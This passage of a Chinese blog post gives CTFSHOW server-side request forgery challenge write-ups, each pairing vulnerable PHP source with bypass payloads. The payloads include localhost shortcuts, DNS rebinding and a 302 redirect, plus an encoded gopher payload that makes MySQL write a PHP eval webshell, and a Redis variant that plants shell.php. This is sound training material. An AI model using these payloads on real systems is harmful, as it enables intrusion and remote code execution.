class="string">'hacker'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>要求host位数小于等于5</p>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//127.1/flag.php</span></span><br><span class="line">url=http:<span class="comment">//0.0/flag.php</span></span><br><span class="line">url=http:<span class="comment">//0/flag.php</span></span><br></pre></td></tr></table></figure>
+<h4 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h4><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$url=$_POST[<span class="string">'url'</span>];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line"><span class="keyword">if</span>($x[<span class="string">'scheme'</span>]===<span class="string">'http'</span>||$x[<span class="string">'scheme'</span>]===<span class="string">'https'</span>)&#123;</span><br><span class="line">$host=$x[<span class="string">'host'</span>];</span><br><span class="line"><span class="keyword">if</span>((strlen($host)&lt;=<span class="number">3</span>))&#123;</span><br><span class="line">$ch=curl_init($url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">$result=curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">echo</span> ($result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>要求host位数小于等于3</p>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//0.0/flag.php</span></span><br><span class="line">url=http:<span class="comment">//0/flag.php</span></span><br><span class="line"><span class="number">0</span>在linux系统中会解析成<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>在windows中解析成<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>
+<h4 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h4><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$url=$_POST[<span class="string">'url'</span>];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line"><span class="keyword">if</span>($x[<span class="string">'scheme'</span>]===<span class="string">'http'</span>||$x[<span class="string">'scheme'</span>]===<span class="string">'https'</span>)&#123;</span><br><span class="line">$ip = gethostbyname($x[<span class="string">'host'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>.$ip.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span>(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'ip!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents($_POST[<span class="string">'url'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'scheme'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>gethostbyname()函数：通过域名获取IP地址</p>
+<p>filter_var() 函数通过指定的过滤器过滤一个变量。</p>
+<p>定义和用法</p>
+<p>FILTER_VALIDATE_IP 过滤器把值作为 IP 进行验证。</p>
+<ul>
+<li>Name: “validate_ip”</li>
+<li>ID-number: 275</li>
+</ul>
+<p>可能的标志：</p>
+<ul>
+<li>FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）</li>
+<li>FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如    2001:0db8:85a3:08d3:1319:8a2e:0370:7334）</li>
+<li>FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）</li>
+<li>FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</li>
+</ul>
+<p>当获取到的ip不在保留的 IP 范围内 可读出flag</p>
+<h5 id="方法一：dns重绑定"><a href="#方法一：dns重绑定" class="headerlink" title="方法一：dns重绑定"></a>方法一：dns重绑定</h5><p>DNS Rebinding</p>
+<p>在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。</p>
+<p><a href="https://zhuanlan.zhihu.com/p/89426041" target="_blank" rel="noopener">浅谈DNS重绑定漏洞</a></p>
+<p><img src="https://i.loli.net/2021/09/27/UcsV2dMe38JaTNr.png" alt="image-20210927201204615"></p>
+<p>当获取到的ip不在保留的 IP 范围内 可读出flag</p>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//36573657.7f000001.rbndr.us/flag.php</span></span><br></pre></td></tr></table></figure>
+<h5 id="方法二：302跳转"><a href="#方法二：302跳转" class="headerlink" title="方法二：302跳转"></a>方法二：302跳转</h5><p>在自己服务器写个php文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location:http://127.0.0.1/flag.php"</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents函数可配合302跳转读取文件</span><br></pre></td></tr></table></figure>
+<h4 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h4><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$url=$_POST[<span class="string">'url'</span>];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^http:\/\/ctf\..*show$/i'</span>,$url))&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>正则表达式的意思是以<a href="http://ctf.开头，以show结尾。" target="_blank" rel="noopener">http://ctf.开头，以show结尾。</a></p>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//ctf.@127.0.0.1/flag.php?show</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/09/27/1ungFzEDTeCN8bX.png" alt="image-20210927203702409"></p>
+<h4 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h4><p>利用Gopherus工具生成payload</p>
+<p><img src="https://i.loli.net/2021/09/27/6iHBgNKvZJFLWVd.png" alt="image-20210927204555611"></p>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:<span class="comment">//127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%61%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%61%2e%70%68%70%22%01%00%00%00%01</span></span><br></pre></td></tr></table></figure>
+<p>对下划线后面的字符进行一次url编码</p>
+<p><img src="https://i.loli.net/2021/09/27/MPvpXADzSE3Rwj7.png" alt="image-20210927205018703"></p>
+<p>进入根目录 看到flag.sh</p>
+<p>执行flag.sh 然后查看flag.txt</p>
+<h4 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h4><p>和上一题相似 数据库换成了redis</p>
+<p><img src="https://i.loli.net/2021/09/27/QsDyvV9w58tipXx.png" alt="image-20210927205813947"></p>
+<p>木马文件名为shell.php</p>
+<p>对下划线后面的字符进行一次url编码</p>
+<p><img src="https://i.loli.net/2021/09/27/Qd3zAtjuJFvqY5D.png" alt="image-20210927205906697"></p>
+<p>查看flag</p>
+<p>a=system(‘cat /flaaag’);</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/09/29/CTFSHOW-web入门-sql注入/" rel="next" title="CTFSHOW-web入门-sql注入">
+                <i class="fa fa-chevron-left"></i> CTFSHOW-web入门-sql注入
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2022/02/25/UNRAID虚拟机安装威联通-I440FX模型-解决网卡问题/" rel="prev" title="UNRAID虚拟机安装威联通 I440FX模型 解决网卡问题">
+                UNRAID虚拟机安装威联通 I440FX模型 解决网卡问题 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80NzA3MC8yMzU3MA=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt>
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <div class="site-description motion-element" itemprop="description">夏天,那个夏天,还有那个夏天,即使经历无数次夏天,我还是说不出口。</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">39</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">33</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.ak6666.top/" title="http://blog.ak6666.top/" rel="noopener" target="_blank">阿凯</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=536976917&auto=1&height=32"></iframe>
+
+
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#ssrf"><span class="nav-number">1.</span> <span class="nav-text">ssrf</span></a></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过姿势-¶"><span class="nav-number"></span> <span class="nav-text">绕过姿势 ¶</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#危害-¶"><span class="nav-number"></span> <span class="nav-text">危害 ¶</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#web351"><span class="nav-number">0.1.</span> <span class="nav-text">web351</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web352"><span class="nav-number">0.2.</span> <span class="nav-text">web352</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web353"><span class="nav-number">0.3.</span> <span class="nav-text">web353</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web354"><span class="nav-number">0.4.</span> <span class="nav-text">web354</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web355"><span class="nav-number">0.5.</span> <span class="nav-text">web355</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web356"><span class="nav-number">0.6.</span> <span class="nav-text">web356</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web357"><span class="nav-number">0.7.</span> <span class="nav-text">web357</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#方法一：dns重绑定"><span class="nav-number">0.7.1.</span> <span class="nav-text">方法一：dns重绑定</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#方法二：302跳转"><span class="nav-number">0.7.2.</span> <span class="nav-text">方法二：302跳转</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web358"><span class="nav-number">0.8.</span> <span class="nav-text">web358</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web359"><span class="nav-number">0.9.</span> <span class="nav-text">web359</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web360"><span class="nav-number">0.10.</span> <span class="nav-text">web360</span></a></li></ol></li></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div> 
+   
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.1</div>
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<span id="busuanzi_container_site_pv">
+    <br>本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.1"></script>
+
+  <script src="/js/motion.js?v=7.1.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.1"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.1"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.1"></script>
+<script src="/js/post-details.js?v=7.1.1"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    <script>
+  window.livereOptions = {
+    refer: '2021/09/29/CTFSHOW-web入门-ssrf/'
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
